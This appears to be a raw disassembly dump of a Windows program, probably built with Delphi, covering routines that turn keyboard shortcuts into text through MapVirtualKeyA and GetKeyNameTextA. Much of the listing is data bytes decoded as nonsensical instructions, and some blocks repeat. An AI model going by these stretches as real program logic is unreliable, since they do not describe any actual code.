jae r-xdata
insd
popad
dec esi
add [ esi + ecx - 0x3017ffbe ] ah
inc ebp
add [ esp + eax * 8 ] dl
inc ebp
add [ eax - 0x44 ] bl
inc ebp
add [ esp + eax * 8 + 0x45 ] al
pushfd
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
add [ eax ] bh
add [ eax ] al
xor [ edi + 0x45 ] 0x0
add al cl
xor al 0x40
add [ eax ] ch
inc eax
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
jpe r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
outsd
outsb
add eax 0x756e654d
je r-xdata
cwde
jpe r-xdata
dec ebp
outsb
jne r-xdata
popad
inc ebx
push 0x65676e61
nop
pop eax
jpe r-xdata
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
add [ eax + 0x480045d0 ] dl
rol [ ebp ] 0x1
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
les eax [ ebp ]
pop eax
mov esp 0xc4440045
inc ebp
inc edx
add [ eax ] cl
leave
inc ebp
add [ eax ] bl
leave
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
outsd
inc eax
jpo r-xdata
je r-xdata
jne r-xdata
xor al [ eax ]
inc esp
xor al [ eax ]
pop esp
rol [ ebp ] 0x1
add [ ebp + 0x7ba40040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
add [ ebx ] al
or al 0x54
push esp
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add al ch
enter 0x45 0xf8
enter 0x45 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add [ eax ] al
xchg esp eax
jpe r-xdata
jpe r-xdata
test [ esi ] cl
inc edx
add ah cl
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jpo r-xdata
je r-xdata
outsd
dec esp
je r-xdata
inc ebp
add al cl
les eax [ ebp ]
je r-xdata
sub al 0xc4
add [ eax ] al
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] r--data
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
clc
jpo r-xdata
insd
popad
dec esp
je r-xdata
push 0x74754274
add [ 0x69526274 ] cl
je r-xdata
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp edx
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
push eax
retn
or [ edi + 0x77 ] ecx
outsb
js r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
inc [ eax + ecx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
adc al 0x5a
inc ebp
add [ eax ] cl
add bh bh
mov esp es
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
push ebp
push esp
inc ecx
add [ eax ] dh
add [ eax ] al
push [ eax - 0x38 ]
inc ebp
add [ eax - 0x3f ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
inc ecx
add [ eax + edx * 8 - 0x2f53ffbb ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
test al 0x55
pop esp
jb r-xdata
add [ eax ] al
add eax 0x75411100
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ esi + 0x45 ] 0x0
or [ eax ] al
add [ eax ] al
mov eax 0xc0004293
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
clc
xchg esp eax
inc edx
add [ ebp + edx * 4 + 0x42 ] bl
add [ edx * 4 - 0x6ad7ffbe ] bh
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9465646f
jpe r-xdata
inc ecx
add al al
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
add [ eax ] al
add [ ebx ] cl
add [ ecx ] cl
dec edi
ja r-xdata
jpo r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
ror [ eax + 0x7e ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x45 ] bl
add [ eax + eax ] dl
add [ eax ] al
cwde
pop ebx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
adc al 0x56
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x65676e61
adc al 0x56
inc ecx
add al ch
add [ ecx ] sub_418264
pushad
0x45
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xchg esp eax
add [ ecx ] sub_418338
js r-xdata
add [ eax - 0x3fffbea5 ] bl
outsb
outsb
push 0x50004570
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] cl
dec edi
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
inc ecx
add [ esp + eax * 8 ] ch
or al [ edx ]
or al 0x89
jpo r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44cbc8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax + edi * 2 ] dh
inc ebp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
pop esp
jb r-xdata
add [ edx + edi * 2 + 0x45 ] dl
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push edx
jne r-xdata
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
outsd
sub_457984
leave
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
test al cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
int3
aam 0x7a
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + edi * 2 + 0x45 ] dl
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6865646f
jo r-xdata
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
inc [ eax + ecx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jpe r-xdata
outsd
cwde
jpe r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
dec esp
je r-xdata
popad
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
pop eax
jpe r-xdata
xor al [ eax ]
inc esp
xor al [ eax ]
pop esp
rol [ ebp ] 0x1
add [ ebp + 0x7ba40040 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax 0x6f42616d
insd
outsb
add [ ebx ] al
or al 0x54
push esp
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
jb r-xdata
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
sub al 0xc4
add [ eax ] al
inc ebp
add al cl
les eax [ ebp ]
je r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + edx * 8 + 0x45 ] bl
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jpo r-xdata
outsd
inc edx
outsd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
jne r-xdata
fdivr [ edx + 0x45 ]
jo r-xdata
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ esi + ecx - 0x3017ffbe ] ah
inc ebp
add [ esp + eax * 8 ] dl
inc ebp
add [ eax - 0x44 ] bl
inc ebp
add [ esp + eax * 8 + 0x45 ] al
pushfd
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
add [ eax ] bh
add [ eax ] al
xor [ edi + 0x45 ] 0x0
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
add al cl
xor al 0x40
add [ eax ] ch
inc eax
outsd
insd
jo r-xdata
je r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax + 0x480045d0 ] dl
rol [ ebp ] 0x1
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
les eax [ ebp ]
pop eax
mov esp 0xc4440045
inc ebp
inc edx
add [ eax ] cl
leave
inc ebp
add [ eax ] bl
leave
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
outsd
inc eax
jpo r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + edi * 2 + 0x740d0045 ] dl
bound edx [ edx + 0x69 ]
push esp
outsd
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add al ch
enter 0x45 0xf8
enter 0x45 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
add [ eax ] al
xchg esp eax
jpe r-xdata
jpe r-xdata
test [ esi ] cl
inc edx
add ah cl
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] r--data
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
clc
jpo r-xdata
insd
popad
dec esp
je r-xdata
push 0x74754274
je r-xdata
add [ 0x69526274 ] cl
je r-xdata
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add esp edx
je r-xdata
jne r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
push eax
retn
or [ edi + 0x77 ] ecx
outsb
js r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jpo r-xdata
je r-xdata
outsd
dec esp
je r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
inc [ eax + ecx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
adc al 0x5a
inc ebp
add [ eax ] cl
add bh bh
mov esp es
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
push ebp
push esp
inc ecx
add [ eax ] dh
add [ eax ] al
push [ eax - 0x38 ]
inc ebp
add [ eax - 0x3f ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
inc ecx
add [ eax + edx * 8 - 0x2f53ffbb ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
test al 0x55
pop esp
jb r-xdata
add [ eax ] al
add eax 0x75411100
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ esi + 0x45 ] 0x0
or [ eax ] al
add [ eax ] al
mov eax 0xc0004293
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
clc
xchg esp eax
inc edx
add [ ebp + edx * 4 + 0x42 ] bl
add [ edx * 4 - 0x6ad7ffbe ] bh
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9465646f
jpe r-xdata
inc ecx
add al al
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
ja r-xdata
add [ eax ] al
add [ ebx ] cl
add [ ecx ] cl
dec edi
ja r-xdata
jpo r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
ror [ eax + 0x7e ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 + 0x45 ] bl
add [ eax + eax ] dl
add [ eax ] al
cwde
pop ebx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
adc al 0x56
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push 0x65676e61
adc al 0x56
inc ecx
add al ch
add [ ecx ] sub_418264
pushad
0x45
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xchg esp eax
add [ ecx ] sub_418338
js r-xdata
add [ eax - 0x3fffbea5 ] bl
outsb
outsb
push 0x50004570
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] cl
dec edi
jb r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
inc ecx
add [ esp + eax * 8 ] ch
or al [ edx ]
or al 0x89
jpo r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44cbc8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax + edi * 2 ] dh
inc ebp
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
pop esp
jb r-xdata
add [ edx + edi * 2 + 0x45 ] dl
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push edx
jne r-xdata
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
outsd
sub_457e5c
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
clc
xchg esp eax
inc edx
add [ ebp + edx * 4 + 0x42 ] bl
add [ edx * 4 - 0x6ad7ffbe ] bh
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x457eb490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
jle r-xdata
test ebx ebx
je r-xdata
je r-xdata
add [ eax ] cl
add [ eax ] al
add [ eax - 0x3fffbd6d ] bh
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44cbc8
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_457f00
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_44736c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44cbc8
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_457f58
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_457f90
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_404008
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404278
sub_457fe4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_4581cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040a0
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4041f0
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040a0
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040a0
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4041f0
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4041f0
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_404008
mov eax esi
call sub_404008
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_4040a0
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408030
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404314
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_457f90
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042d0
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_4040a0
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042d0
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4042d0
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4042d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4581d4
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_40402c
retn
sub_4581e8
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4042c8
push eax
mov eax edi
call sub_4042c8
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4042c8
push eax
mov eax edi
call sub_4044c8
push eax
mov eax [ esi ]
call sub_4044c8
pop edx
pop ecx
call sub_407f10
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4042c8
mov ecx eax
mov eax esi
mov edx 0x1
call sub_404568
sub_458244
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_45831f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4581e8
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4581e8
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4581e8
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4581e8
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458326
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40402c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_457fe4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407ec0
test eax eax
jne r-xdata
sub_45835c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45a8fc
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45a90c
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_4583bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45a8fc
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45a8fc
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
